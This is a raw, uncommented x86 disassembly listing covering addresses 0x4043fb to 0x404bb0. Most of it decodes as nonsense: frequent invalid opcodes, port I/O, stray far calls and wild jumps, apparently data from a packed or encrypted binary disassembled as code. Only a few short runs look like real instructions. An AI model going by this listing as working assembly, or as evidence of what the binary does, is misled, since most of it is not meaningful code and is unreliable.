  4043fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043fc:	pop    ecx
  4043fd:	push   cs
  4043fe:	xchg   ch,ah
  404400:	jns    0x4043a7
  404402:	je     0x404462
  404404:	mov    eax,ds:0x16bfe098
  404409:	imul   edi,DWORD PTR [ebx],0xffffffe9
  40440c:	rol    DWORD PTR [eax+0xa8e994d],cl
  404412:	pop    ds
  404413:	dec    edx
  404414:	xor    DWORD PTR [ecx],edx
  404416:	jno    0x4043c2
  404418:	or     ah,BYTE PTR [edi-0x5478e545]
  40441e:	ss xchg ebx,eax
  404420:	sbb    eax,0xd1addb45
  404425:	or     eax,esp
  404427:	xor    al,0x61
  404429:	call   0xab8f:0x82580458
  404430:	ds jmp 0x40448b
  404433:	fcmovne st,st(3)
  404435:	and    al,0xa3
  404437:	add    DWORD PTR [esi+0x58e040a],0xa34e933b
  404441:	adc    DWORD PTR [edx-0x28],0x4067c1b8
  404448:	sub    bh,ah
  40444a:	jle    0x404470
  40444c:	fist   DWORD PTR [esi]
  40444e:	pop    edx
  40444f:	add    DWORD PTR [eax],edi
  404451:	test   al,0xf
  404453:	mov    ecx,0xfe946cfb
  404458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404459:	mov    ebp,0x5dbc44f4
  40445e:	cs jne 0x40442f
  404461:	nop
  404462:	mov    BYTE PTR [edx+ecx*1],ah
  404465:	mov    bl,0x39
  404467:	inc    esi
  404468:	or     BYTE PTR gs:[ebx+0x2],al
  40446c:	bound  esp,QWORD PTR [edi-0x7b523ee1]
  404472:	sbb    eax,0x7ccdb9a7
  404477:	repz fnsetpm(287 only) 
  40447a:	fst    QWORD PTR [eax-0x5aca73b5]
  404480:	cmp    eax,0xbdb73738
  404485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404486:	(bad)  
  404487:	xchg   ebp,eax
  404488:	je     0x404467
  40448a:	repz or esi,DWORD PTR [ebp+ecx*2-0x19]
  40448f:	cs dec edi
  404491:	pop    eax
  404493:	mov    bl,0x2e
  404495:	in     eax,dx
  404496:	out    0xa6,al
  404498:	xchg   DWORD PTR [ebx],edi
  40449a:	sub    BYTE PTR ds:0x2427fd48,dh
  4044a0:	mov    ch,0xe7
  4044a2:	pop    ss
  4044a3:	push   esi
  4044a4:	jae    0x4044c1
  4044a6:	test   BYTE PTR [ebp-0x8635351],ah
  4044ac:	inc    ecx
  4044ad:	push   edi
  4044ae:	out    dx,al
  4044af:	pop    es
  4044b0:	adc    dl,BYTE PTR [ebp+0x397347a2]
  4044b6:	and    ah,dl
  4044b8:	xchg   bl,dl
  4044ba:	mov    al,al
  4044bc:	add    eax,0x8a601e6d
  4044c1:	jecxz  0x404514
  4044c3:	rcr    DWORD PTR [eax+0x64],1
  4044c6:	cmp    BYTE PTR [ecx],ch
  4044c8:	int    0x45
  4044ca:	aad    0xd
  4044cc:	les    eax,FWORD PTR [ebx-0x72664750]
  4044d2:	(bad)  
  4044d3:	popa   
  4044d4:	(bad)  
  4044d6:	mov    cs,ebx
  4044d8:	sub    ecx,edi
  4044da:	cmp    BYTE PTR [ecx+eiz*1],ch
  4044dd:	lea    esi,[edx+0x3c]
  4044e0:	or     BYTE PTR [edx],bl
  4044e2:	test   BYTE PTR [edi+0x376da492],bl
  4044e8:	xchg   ebx,eax
  4044e9:	and    BYTE PTR [ebx+0x2],dh
  4044ec:	gs pop ecx
  4044ee:	jb     0x40450a
  4044f0:	mov    eax,0x8aca4ac7
  4044f5:	xchg   ebx,eax
  4044f6:	loopne 0x4044bb
  4044f8:	mov    eax,0x9ac3ef9f
  4044fd:	cs out dx,al
  4044ff:	xor    DWORD PTR [edi],0xfffffff0
  404502:	rcl    BYTE PTR [ecx],0xdf
  404505:	in     eax,dx
  404506:	pop    esi
  404507:	jge    0x404563
  404509:	sub    ecx,edx
  40450b:	or     eax,0x9518ce09
  404510:	and    edi,DWORD PTR [edx]
  404512:	and    ebp,DWORD PTR [ebx+ebx*1]
  404515:	lds    esi,FWORD PTR [esi]
  404517:	into   
  404518:	jbe    0x40451b
  40451a:	mov    ds:0x93d8c271,eax
  40451f:	(bad)  
  404520:	pop    DWORD PTR [eax+0x35ed751a]
  404526:	push   ebp
  404527:	jl     0x40450b
  404529:	inc    ebp
  40452a:	adc    eax,edi
  40452c:	ds sbb cl,ah
  40452f:	or     esi,ecx
  404531:	sub    edi,ebp
  404533:	cmc    
  404534:	(bad)  
  404535:	push   ebx
  404536:	sbb    cl,BYTE PTR [esi-0x2e5bd44b]
  40453c:	sub    dl,al
  40453e:	xchg   esi,esp
  404540:	fbstp  TBYTE PTR [esp+edx*2+0x13]
  404544:	imul   ebp,ecx,0xfffffffe
  404547:	dec    esi
  404548:	jno    0x404501
  40454a:	adc    esi,DWORD PTR [ebx+ebp*2]
  40454d:	xor    ch,BYTE PTR [ebx+esi*8-0x58]
  404551:	push   cs
  404552:	(bad)  
  404553:	(bad)  
  404554:	xchg   ebx,eax
  404555:	jmp    0x48dea7ee
  40455a:	mov    dh,0xbb
  40455c:	jmp    0x68b8d641
  404561:	push   0xffffffed
  404563:	call   0x2e97:0x305f63a0
  40456a:	dec    esp
  40456b:	pusha  
  40456c:	add    ecx,ebx
  40456e:	cli    
  40456f:	int    0x37
  404571:	jo     0x404554
  404573:	sbb    ecx,ebx
  404575:	jmp    0x1705:0x443e4a4b
  40457c:	inc    esp
  40457d:	jno    0x4045e4
  40457f:	push   0xffffffc1
  404581:	or     eax,0x68fdf394
  404586:	mov    ah,0xde
  404588:	mov    cs,WORD PTR [edx+0x73ee95aa]
  40458e:	out    0xf3,eax
  404590:	add    DWORD PTR [ebp+0x2e],edi
  404593:	ds icebp 
  404595:	jmp    0x40454c
  404597:	xchg   esi,eax
  404599:	mov    BYTE PTR [ebx+edx*1+0x57812d75],dl
  4045a0:	xor    al,0x37
  4045a2:	dec    eax
  4045a3:	sub    ebp,DWORD PTR [ebx+0x5dada6e]
  4045a9:	shr    DWORD PTR [edi],cl
  4045ab:	aam    0x96
  4045ad:	adc    BYTE PTR [ebx+0x19ecd49c],cl
  4045b3:	or     BYTE PTR ss:[ecx],ch
  4045b6:	outs   dx,BYTE PTR ds:[esi]
  4045b7:	or     dh,BYTE PTR ds:0x8ec00b5f
  4045bd:	call   0x7beb:0xedaf568
  4045c4:	jnp    0x40459b
  4045c6:	sbb    edx,0xdc365dd6
  4045cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045cd:	cmp    BYTE PTR [eax+eiz*1],0x4a
  4045d1:	sti    
  4045d2:	push   edx
  4045d3:	je     0x4045e9
  4045d5:	inc    esi
  4045d6:	cmp    DWORD PTR [esi-0x26],ebp
  4045d9:	jmp    0x4045dd
  4045db:	or     eax,0x54f20df4
  4045e0:	push   esi
  4045e1:	lods   al,BYTE PTR ds:[esi]
  4045e2:	pop    es
  4045e3:	inc    edi
  4045e4:	mov    eax,ds:0xbb43c48b
  4045e9:	mov    eax,eax
  4045eb:	push   ebx
  4045ec:	call   0x67cc:0xebc65b4
  4045f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045f4:	outs   dx,BYTE PTR ds:[esi]
  4045f5:	adc    bh,cl
  4045f7:	or     DWORD PTR [esi+ecx*4+0x73],esi
  4045fb:	ins    DWORD PTR es:[edi],dx
  4045fc:	into   
  4045fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045fe:	and    BYTE PTR [eax+0x49],bh
  404601:	xchg   BYTE PTR ds:[edi-0x9],dh
  404605:	arpl   WORD PTR ds:0x8e4cf545,dx
  40460b:	xor    ch,BYTE PTR [eax-0x6c]
  40460e:	call   esi
  404610:	dec    ebx
  404611:	or     BYTE PTR [eax-0x66],dl
  404614:	sub    BYTE PTR [ebx+0xb],0x49
  404618:	xor    eax,0xb06df15
  40461d:	loope  0x404615
  40461f:	pushf  
  404620:	and    dh,BYTE PTR [eax+0x28d09f78]
  404626:	dec    edi
  404627:	daa    
  404628:	cmp    al,0xe1
  40462a:	retf   
  40462b:	pop    edx
  40462c:	sbb    DWORD PTR [ebp+0x6c4024bd],ebx
  404632:	xchg   edi,eax
  404633:	(bad)
  404637:	js     0x4045bd
  404639:	imul   edx,DWORD PTR [edx+edx*1],0x7
  40463d:	andnps xmm0,XMMWORD PTR [ecx-0x5b]
  404641:	push   ebp
  404642:	pop    ebp
  404643:	mov    al,dh
  404645:	in     al,dx
  404646:	adc    al,0x30
  404648:	fwait
  404649:	mov    eax,edx
  40464b:	mov    ecx,0x60b79f4a
  404650:	xchg   DWORD PTR [ecx-0x7783e485],eax
  404656:	and    eax,0x778e3ffb
  40465b:	stc    
  40465c:	test   eax,0x999c6cef
  404661:	sub    edi,ebp
  404663:	lods   al,BYTE PTR ds:[esi]
  404664:	or     BYTE PTR [ecx],ch
  404666:	fwait
  404667:	pop    edx
  404668:	addr16 mov dl,0x6
  40466b:	sub    DWORD PTR [edx+0x67ed3d63],edi
  404671:	xor    BYTE PTR [ecx-0x682172c3],ah
  404677:	cmp    eax,0xeca48190
  40467c:	scas   eax,DWORD PTR es:[edi]
  40467d:	dec    dl
  40467f:	xor    esi,DWORD PTR fs:[edi+edx*1+0x6c8d2076]
  404687:	std    
  404688:	xchg   edx,eax
  404689:	pusha  
  40468a:	fst    QWORD PTR [ebp-0x68]
  40468d:	icebp  
  40468e:	and    al,0x5b
  404690:	aas    
  404691:	jb     0x29e65ff3
  404697:	sbb    al,0x54
  404699:	js     0x40467c
  40469b:	xchg   esp,eax
  40469c:	pop    es
  40469d:	cmp    dh,ah
  40469f:	cmp    eax,ebx
  4046a1:	cwde   
  4046a2:	cli    
  4046a3:	add    BYTE PTR [edx],ah
  4046a5:	(bad)
  4046a8:	xchg   esi,eax
  4046a9:	adc    DWORD PTR [esi+0x28],esi
  4046ac:	scas   eax,DWORD PTR es:[edi]
  4046ad:	add    eax,0x76f8dd72
  4046b2:	pop    edx
  4046b3:	sahf   
  4046b4:	out    dx,al
  4046b5:	add    eax,0x43a8fbbc
  4046ba:	call   DWORD PTR [edx-0x661bd077]
  4046c0:	mov    ah,0xdf
  4046c2:	cbw    
  4046c4:	inc    esp
  4046c5:	xchg   ebx,eax
  4046c6:	jmp    0x40466e
  4046c8:	adc    ecx,DWORD PTR [eax+0x3a]
  4046cb:	enter  0x58f4,0xe9
  4046cf:	pop    edx
  4046d0:	or     ch,ch
  4046d2:	xlat   BYTE PTR ds:[ebx]
  4046d3:	dec    ebx
  4046d4:	sbb    al,0x72
  4046d6:	test   BYTE PTR [edi+0x25],bh
  4046d9:	add    eax,0xfa8967a7
  4046de:	push   cs
  4046df:	mov    WORD PTR [esi-0x30],cs
  4046e2:	out    0xce,al
  4046e4:	push   esi
  4046e5:	call   0xfdf44a0f
  4046ea:	ds mov ah,0x50
  4046ed:	(bad)  
  4046ee:	or     eax,0x7a8143eb
  4046f3:	dec    esi
  4046f4:	je     0x40473b
  4046f6:	xor    eax,0xe5de7dea
  4046fb:	or     ch,BYTE PTR [edi+0xe]
  4046fe:	aas    
  4046ff:	dec    esp
  404700:	jnp    0x404749
  404702:	call   0x1a7b:0xd96afa94
  404709:	neg    eax
  40470b:	adc    edi,esi
  40470d:	push   ebx
  40470e:	dec    esi
  40470f:	push   ecx
  404710:	retf   
  404711:	sub    al,0xfd
  404713:	mov    dh,0x77
  404715:	pushf  
  404716:	lock pop esp
  404718:	xchg   esi,eax
  404719:	and    eax,0xcc447e6e
  40471e:	or     BYTE PTR [ebx-0x61bce1c6],0x83
  404725:	inc    esi
  404726:	xor    DWORD PTR [ecx-0x5ab37634],esp
  40472c:	lea    edi,[ebx+0x244e5ab4]
  404732:	in     al,dx
  404733:	(bad)  
  404734:	int3   
  404735:	or     BYTE PTR [ecx-0x28],bl
  404738:	aad    0x6b
  40473a:	push   0xffffffb3
  40473c:	shrd   ecx,edx,0x2
  404740:	or     DWORD PTR ds:0x428283,0x42823f
  40474a:	shr    edx,0x2
  40474d:	mov    edx,DWORD PTR ds:0x42825f
  404753:	or     DWORD PTR ds:0x42835f,edx
  404759:	mov    DWORD PTR [ebp-0x1c],ecx
  40475c:	jmp    0x404b3a
  404761:	add    al,0x2a
  404763:	lea    edi,[eax+0x1a]
  404766:	fcomp  QWORD PTR ss:[edx]
  404769:	pop    edi
  40476a:	or     al,0x3f
  40476c:	mov    esi,0xb06da6c4
  404771:	fcmovnb st,st(7)
  404773:	sbb    BYTE PTR [eax],bl
  404775:	sahf   
  404776:	adc    bl,BYTE PTR [eax]
  404778:	sbb    BYTE PTR [eax],dl
  40477a:	sub    DWORD PTR [ecx+0x2f],esp
  40477d:	and    al,0x6c
  40477f:	adc    ebp,esi
  404781:	dec    DWORD PTR [edi]
  404783:	xchg   ecx,eax
  404784:	(bad)  
  404785:	mov    edi,0x2ef71dba
  40478a:	loop   0x40475e
  40478c:	push   ebp
  40478d:	add    bh,bh
  40478f:	add    BYTE PTR [ebx+ebp*8-0x52],ah
  404793:	dec    esi
  404794:	into   
  404795:	hlt    
  404796:	repnz xchg ecx,eax
  404798:	add    edi,DWORD PTR [ebx+0x0]
  40479b:	ja     0x4047c2
  40479d:	cmp    BYTE PTR [edi+0x6],0xa8
  4047a1:	sar    DWORD PTR [ebx-0x28ed531e],0x7f
  4047a8:	mov    eax,eax
  4047aa:	daa    
  4047ab:	jle    0x404747
  4047ad:	xchg   ecx,eax
  4047ae:	lods   eax,DWORD PTR ds:[esi]
  4047af:	inc    eax
  4047b0:	xchg   edi,eax
  4047b1:	xchg   ecx,eax
  4047b2:	add    BYTE PTR [eax-0x4b],dh
  4047b5:	ins    DWORD PTR es:[edi],dx
  4047b6:	and    DWORD PTR [eax],0xf74c6d06
  4047bc:	fldenv [edx]
  4047be:	push   eax
  4047bf:	mov    ds:0x3d2add9f,al
  4047c4:	add    BYTE PTR [ebx+edx*1],0x46
  4047c8:	aad    0xac
  4047ca:	(bad)  
  4047cb:	repz inc esi
  4047cd:	or     eax,0xa63ddc43
  4047d2:	fcmovb st,st(5)
  4047d4:	mov    dl,0xba
  4047d6:	lods   eax,DWORD PTR ds:[esi]
  4047d7:	or     BYTE PTR ds:0x5357cc07,al
  4047dd:	cli    
  4047de:	gs jle 0x4047de
  4047e1:	ss jecxz 0x40484f
  4047e4:	sbb    eax,0x4c401ad
  4047e9:	les    esp,FWORD PTR [ebx]
  4047eb:	int    0x5d
  4047ed:	out    dx,eax
  4047ee:	pop    ecx
  4047ef:	fwait
  4047f0:	and    eax,0xe6dc0850
  4047f5:	push   ss
  4047f6:	and    al,0x3b
  4047f8:	mov    ds:0xfadf7c14,eax
  4047fd:	outs   dx,BYTE PTR ds:[esi]
  4047fe:	pop    esi
  4047ff:	mov    WORD PTR [edi+0x12b088a8],cs
  404805:	aaa    
  404806:	bound  esi,QWORD PTR ds:0xde180a89
  40480c:	frstor ds:0xb7b9d775
  404812:	or     ebp,esi
  404814:	pop    ss
  404815:	mov    dl,BYTE PTR [ebx-0x2095d69e]
  40481b:	int3   
  40481c:	cmp    DWORD PTR [ebx],esi
  40481e:	push   ebx
  40481f:	mov    dh,0xbc
  404821:	aaa    
  404822:	push   ebp
  404823:	inc    esp
  404824:	imul   esi,DWORD PTR [esp+esi*1+0x29],0x57ddf77d
  40482c:	fwait
  40482d:	pop    es
  40482e:	xchg   edx,eax
  40482f:	xor    ebx,DWORD PTR [esi]
  404831:	jae    0x404894
  404833:	mov    bl,0x1e
  404835:	aam    0xaa
  404837:	xchg   esp,eax
  404838:	(bad)  
  404839:	test   al,0x3e
  40483b:	mov    ch,0x55
  40483d:	ins    BYTE PTR es:[edi],dx
  40483e:	mov    ebp,0xdb9f6704
  404843:	or     ah,al
  404845:	ret    0xb432
  404848:	xlat   BYTE PTR ds:[ebx]
  404849:	(bad)  
  40484b:	cmp    al,0x57
  40484d:	pop    ss
  40484e:	push   edi
  40484f:	mov    cs:0xb8c6f127,eax
  404855:	push   ss
  404856:	das    
  404857:	rcl    DWORD PTR [edx],0x11
  40485a:	mov    eax,ds:0x1a110038
  40485f:	call   0x112:0xba2fb5d0
  404866:	mov    edi,DWORD PTR [ebx-0x24]
  404869:	loope  0x404894
  40486b:	lahf   
  40486c:	push   edi
  40486d:	cld    
  40486e:	int3   
  40486f:	retf   0xc31d
  404872:	mov    esi,0x971af5a6
  404877:	fbstp  TBYTE PTR [edx]
  404879:	rcr    bh,1
  40487b:	jbe    0x4048c9
  40487d:	fiadd  WORD PTR ds:0x6fae833d
  404883:	fidivr WORD PTR [edi+0x6e]
  404886:	or     eax,esp
  404888:	jno    0x404819
  40488a:	ja     0x4048a0
  40488c:	add    BYTE PTR [edi],0xc4
  40488f:	jp     0x404837
  404891:	aaa    
  404892:	push   edi
  404893:	addr16 inc edx
  404895:	pop    ebx
  404896:	xlat   BYTE PTR ds:[ebx]
  404897:	sahf   
  404898:	retf   
  404899:	mov    cl,0xc8
  40489b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40489c:	jns    0x40482b
  40489e:	jmp    0x4048c0
  4048a0:	ins    BYTE PTR es:[edi],dx
  4048a1:	repnz (bad) 
  4048a3:	call   0x4ef6e2f7
  4048a8:	and    eax,0x8263655e
  4048ad:	int3   
  4048ae:	cmp    eax,0x64db4a90
  4048b3:	pop    eax
  4048b4:	sbb    DWORD PTR [edi-0x66fe20f6],esi
  4048ba:	push   eax
  4048bb:	mov    ebp,?
  4048bd:	pop    es
  4048be:	int3   
  4048bf:	sub    bh,BYTE PTR [ebp+0x6]
  4048c2:	lea    eax,[edi]
  4048c4:	sub    al,BYTE PTR [ebp+0x5269f9a1]
  4048ca:	cwde   
  4048cb:	jo     0x404932
  4048cd:	sub    al,0xad
  4048cf:	loopne 0x404938
  4048d1:	jne    0x404907
  4048d3:	out    dx,al
  4048d4:	popf   
  4048d5:	mov    al,ds:0x1f91afff
  4048da:	push   cs
  4048db:	push   esp
  4048dc:	aam    0x89
  4048de:	fcomp  QWORD PTR [ecx-0x13]
  4048e1:	test   edi,edx
  4048e3:	dec    ebx
  4048e4:	pop    ebp
  4048e5:	nop    esp
  4048e8:	loopne 0x404905
  4048ea:	in     eax,0xb2
  4048ec:	lock dec edi
  4048ee:	push   ecx
  4048ef:	mov    dl,0x4
  4048f1:	fcmovb st,st(7)
  4048f3:	dec    edi
  4048f4:	jbe    0x404891
  4048f6:	int    0xe
  4048f8:	mov    ds:0x79d35d03,eax
  4048fd:	test   DWORD PTR [esi+0x4e],ebp
  404900:	adc    ah,ch
  404902:	push   ds
  404903:	(bad)  
  404904:	out    dx,eax
  404905:	shl    DWORD PTR [edx+0x1095426],1
  40490b:	scas   al,BYTE PTR es:[edi]
  40490c:	adc    ebx,DWORD PTR [ebx-0x4c]
  40490f:	and    DWORD PTR [edi+esi*4+0x9],ebx
  404913:	push   esp
  404914:	jno    0x4048c7
  404916:	loopne 0x4048fa
  404918:	push   ecx
  404919:	pop    ds
  40491a:	sbb    DWORD PTR [ecx],esi
  40491c:	(bad)  
  40491d:	repz (bad) 
  40491f:	mov    ds:0xb16e6714,eax
  404924:	jae    0x404984
  404926:	retf   
  404927:	dec    ebp
  404928:	int    0xfc
  40492a:	sar    BYTE PTR ds:0x540d08d1,1
  404930:	jge    0x4048dd
  404932:	les    eax,FWORD PTR [edx-0x31584ad2]
  404938:	push   eax
  404939:	scas   eax,DWORD PTR es:[edi]
  40493a:	cmp    cl,BYTE PTR ds:0xfe0af3b6
  404940:	popa   
  404941:	and    DWORD PTR [ebp-0x7],ecx
  404944:	cmp    BYTE PTR [ecx+eiz*2+0x58],0xc8
  404949:	in     al,0xad
  40494b:	lods   al,BYTE PTR ds:[esi]
  40494c:	jns    0x404976
  40494e:	call   ebx
  404950:	ret    0xca9d
  404953:	push   ecx
  404954:	and    al,0xd7
  404956:	xchg   DWORD PTR [edx+ebp*4-0x20],ebp
  40495a:	and    ebx,edx
  40495c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40495d:	xchg   ebx,eax
  40495e:	inc    edi
  40495f:	mov    ah,al
  404961:	jnp    0x404918
  404963:	sti    
  404964:	scas   eax,DWORD PTR es:[edi]
  404965:	jb     0x40493f
  404967:	loope  0x404934
  404969:	inc    ebx
  40496a:	ja     0x404995
  40496c:	xor    DWORD PTR [ecx+0x34],esi
  40496f:	ja     0x40498a
  404971:	jne    0x40493c
  404973:	push   ss
  404974:	pop    ebx
  404975:	sbb    eax,0xdef062d7
  40497a:	sbb    bh,BYTE PTR ds:0x109bab0d
  404980:	adc    ch,BYTE PTR [ebx+0x236ea909]
  404986:	out    dx,eax
  404987:	xchg   BYTE PTR [ebp+ebp*2+0x4b],bl
  40498b:	jmp    0x621f4367
  404990:	shl    BYTE PTR [esi-0x29],1
  404993:	loope  0x4049cb
  404995:	ins    DWORD PTR es:[edi],dx
  404996:	fiadd  WORD PTR cs:[edi]
  404999:	scas   al,BYTE PTR es:[edi]
  40499a:	in     eax,0xd4
  40499c:	ja     0x4049f7
  40499e:	popa   
  40499f:	aad    0x20
  4049a1:	push   ebx
  4049a3:	jge    0x4049cd
  4049a5:	cmp    ecx,DWORD PTR [ebx-0x3b]
  4049a8:	leave  
  4049a9:	sahf   
  4049aa:	js     0x404980
  4049ac:	mov    ebx,0xc4ca8f31
  4049b1:	es xchg edi,eax
  4049b3:	je     0x4049c3
  4049b5:	pop    ss
  4049b6:	adc    eax,0xcf574554
  4049bb:	stos   BYTE PTR es:[edi],al
  4049bc:	mov    al,ds:0xbf4c4923
  4049c1:	cdq    
  4049c2:	sti    
  4049c3:	fwait
  4049c4:	inc    esi
  4049c5:	imul   ebp,DWORD PTR [esi],0xffffffde
  4049c8:	sbb    ebp,DWORD PTR [esi]
  4049ca:	cld    
  4049cb:	adc    BYTE PTR [ebp+0x56eeb195],ch
  4049d1:	add    cl,cl
  4049d3:	cmp    cl,cl
  4049d5:	int3   
  4049d6:	mov    ah,0xe7
  4049d8:	xchg   DWORD PTR [ebp-0x75a8d3d2],ebx
  4049de:	add    DWORD PTR [ebx],edi
  4049e0:	inc    ecx
  4049e1:	mov    BYTE PTR [esi],dl
  4049e3:	pop    ebx
  4049e4:	cmc    
  4049e5:	enter  0x70ee,0xf1
  4049e9:	pop    edx
  4049ea:	add    eax,DWORD PTR [edi]
  4049ec:	jnp    0x404998
  4049ee:	bnd jae 0x404993
  4049f1:	xor    al,0xb9
  4049f3:	push   ecx
  4049f4:	dec    ecx
  4049f5:	pusha  
  4049f6:	stos   BYTE PTR es:[edi],al
  4049f7:	xchg   esi,eax
  4049f8:	xlat   BYTE PTR ds:[ebx]
  4049f9:	mov    dh,BYTE PTR [edx-0x76890656]
  4049ff:	fcomp  QWORD PTR [esi+0x5e]
  404a02:	mov    eax,ds:0x5715d767
  404a07:	xlat   BYTE PTR ds:[ebx]
  404a08:	ror    al,0xb5
  404a0b:	xchg   edi,esi
  404a0d:	(bad)  
  404a0e:	(bad)  
  404a0f:	cmp    bl,BYTE PTR [eax+0x540297db]
  404a15:	fidiv  WORD PTR [ecx+0x4]
  404a18:	mov    al,0xf4
  404a1a:	pop    es
  404a1b:	add    eax,0x65d929d9
  404a20:	pop    ebx
  404a21:	fstp   DWORD PTR [ecx]
  404a23:	mov    ds:0x9df03977,al
  404a28:	xor    edi,esi
  404a2a:	mov    bl,0xdb
  404a2c:	jg     0x404a22
  404a2e:	ins    DWORD PTR es:[edi],dx
  404a2f:	loope  0x404a1e
  404a31:	cmp    eax,0xffce5bf8
  404a36:	jb     0x404a2f
  404a38:	clc    
  404a39:	out    0xe4,al
  404a3b:	mov    ah,0x1
  404a3d:	sbb    ch,BYTE PTR [ebx]
  404a3f:	mov    esp,0x5e5efcf
  404a44:	pop    ecx
  404a45:	push   edx
  404a46:	xor    BYTE PTR [ebx+ecx*1],bl
  404a49:	fisttp WORD PTR [ecx-0x59978839]
  404a4f:	jle    0x4049d7
  404a51:	push   ebp
  404a52:	pop    edx
  404a53:	out    dx,al
  404a54:	inc    ecx
  404a55:	mov    DWORD PTR [ecx-0x2c5912e2],esp
  404a5b:	fidiv  WORD PTR [ecx]
  404a5d:	jae    0x404a4e
  404a5f:	push   ebx
  404a60:	and    ecx,DWORD PTR [eax+0x9]
  404a63:	pop    ds
  404a64:	mov    al,bh
  404a66:	call   0xea75:0x88a938a6
  404a6d:	stc    
  404a6e:	add    BYTE PTR [esi-0x19],0xa0
  404a72:	(bad)  
  404a73:	sbb    ah,al
  404a75:	icebp  
  404a76:	out    dx,eax
  404a77:	jbe    0x404a5b
  404a79:	xchg   ebp,eax
  404a7a:	pop    ebx
  404a7b:	mov    DWORD PTR [ebx],esi
  404a7d:	and    eax,0x1efc7e5f
  404a82:	(bad)  
  404a83:	retf   0x933c
  404a86:	mov    ?,esi
  404a88:	inc    esi
  404a89:	mov    edx,0xc96f8161
  404a8e:	mov    dl,BYTE PTR [edx]
  404a90:	ins    DWORD PTR es:[edi],dx
  404a91:	iret   
  404a92:	outs   dx,BYTE PTR ds:[esi]
  404a93:	sbb    eax,0x6f8c39be
  404a98:	xor    BYTE PTR [esi],cl
  404a9a:	add    al,0x66
  404a9c:	nop
  404a9d:	das    
  404a9e:	pop    ss
  404a9f:	jbe    0x404b0a
  404aa1:	sbb    ebx,edi
  404aa3:	inc    edx
  404aa4:	scas   eax,DWORD PTR es:[edi]
  404aa5:	nop
  404aa6:	clc    
  404aa7:	sbb    bl,bh
  404aa9:	mov    dh,0xf
  404aab:	sub    esi,eax
  404aad:	inc    esp
  404aae:	jmp    0x4fde:0x23921047
  404ab5:	iret   
  404ab6:	arpl   WORD PTR [esi],si
  404ab8:	test   edx,eax
  404aba:	aaa    
  404abb:	not    cl
  404abd:	daa    
  404abe:	cdq    
  404abf:	shl    DWORD PTR [edx],0xbc
  404ac2:	rcr    BYTE PTR [edx],0xe9
  404ac5:	mov    esi,0x7d7583cd
  404aca:	and    bh,bl
  404acc:	scas   al,BYTE PTR es:[edi]
  404acd:	jns    0x404ae4
  404acf:	xchg   edx,eax
  404ad0:	pop    ebp
  404ad1:	add    ebx,ecx
  404ad3:	mov    ah,0xf9
  404ad5:	inc    ebx
  404ad6:	jb     0x404ae8
  404ad8:	pop    esi
  404ad9:	add    ebp,DWORD PTR [edi+0x3a505793]
  404adf:	push   es
  404ae0:	add    esp,esp
  404ae2:	push   edx
  404ae3:	mov    dh,0xa9
  404ae5:	or     dh,BYTE PTR [ebp+0x5fb02067]
  404aeb:	clc    
  404aec:	fsub   st(6),st
  404aee:	push   edx
  404aef:	xchg   ebx,eax
  404af0:	xor    al,BYTE PTR [ebx+0x25]
  404af3:	jo     0x404b07
  404af5:	dec    edx
  404af6:	mov    al,0xb2
  404af8:	adc    eax,0xf8beaa27
  404afd:	dec    ecx
  404afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404aff:	jno    0x404b32
  404b01:	lods   al,BYTE PTR ds:[esi]
  404b02:	xlat   BYTE PTR ds:[ebx]
  404b03:	cmp    esi,esp
  404b05:	add    eax,0xceee0e8a
  404b0a:	push   0x5d
  404b0c:	mov    ch,BYTE PTR ds:0xe5cb4c1b
  404b12:	mov    ah,0x31
  404b14:	aaa    
  404b15:	pop    es
  404b16:	lods   eax,DWORD PTR ds:[esi]
  404b17:	cmc    
  404b18:	cld    
  404b19:	cmp    eax,0x6816db2c
  404b1e:	lods   al,BYTE PTR ds:[esi]
  404b1f:	ror    BYTE PTR [edi+0x24],cl
  404b22:	bound  edi,QWORD PTR [edi-0x4b3a28c9]
  404b28:	pop    ds
  404b29:	(bad)  
  404b2a:	bound  eax,QWORD PTR ds:[edx*4+0x13dc48be]
  404b32:	mov    ah,0xee
  404b34:	mov    ah,0x38
  404b36:	in     al,0x36
  404b38:	enter  0x8b83,0xb
  404b3c:	mov    edx,DWORD PTR [ebx+0x4]
  404b3f:	xor    DWORD PTR [ebp-0x1c],edi
  404b42:	add    DWORD PTR ds:0x428273,0x4282e7
  404b4c:	xor    edx,edx
  404b4e:	jmp    0x404f2c
  404b53:	scas   al,BYTE PTR es:[edi]
  404b54:	ds out dx,al
  404b56:	and    ebx,DWORD PTR [edi+0x22]
  404b59:	sbb    bh,BYTE PTR [edx]
  404b5b:	fsubp  st(5),st
  404b5d:	push   ebx
  404b5e:	stos   BYTE PTR es:[edi],al
  404b5f:	div    esi
  404b61:	pop    edi
  404b62:	jo     0x404bc4
  404b64:	rcr    DWORD PTR [eax],0x18
  404b67:	sahf   
  404b68:	adc    bl,BYTE PTR [eax]
  404b6a:	sbb    BYTE PTR [esi+0x68],al
  404b6d:	xor    eax,0x809f252e
  404b72:	cmp    eax,0xffffffcf
  404b75:	or     DWORD PTR [ecx-0x65],0x3b
  404b79:	push   ds
  404b7a:	loopne 0x404b17
  404b7c:	fisub  DWORD PTR [esi]
  404b7e:	inc    ecx
  404b7f:	fistp  WORD PTR [ebp+0x6a]
  404b82:	je     0x404b5a
  404b84:	rol    BYTE PTR gs:0x205e30bf,cl
  404b8b:	adc    al,0x87
  404b8d:	ins    DWORD PTR es:[edi],dx
  404b8e:	jle    0x404b49
  404b90:	push   edx
  404b91:	sub    esi,0xffffffc9
  404b94:	inc    esi
  404b95:	or     ecx,esi
  404b97:	(bad)  
  404b98:	pop    esp
  404b99:	inc    ebx
  404b9a:	pushf  
  404b9b:	pop    ds
  404b9c:	push   0xa83c14c8
  404ba1:	stos   DWORD PTR es:[edi],eax
  404ba2:	clc    
  404ba3:	gs pop ebp
  404ba5:	xchg   BYTE PTR [edx+esi*2+0x71],bh
  404ba9:	dec    edi
  404baa:	icebp  
  404bab:	ret    
  404bac:	push   es
  404bad:	lds    edi,FWORD PTR [edi+esi*2]
  404bb0:	mov    edi,0x612e6098
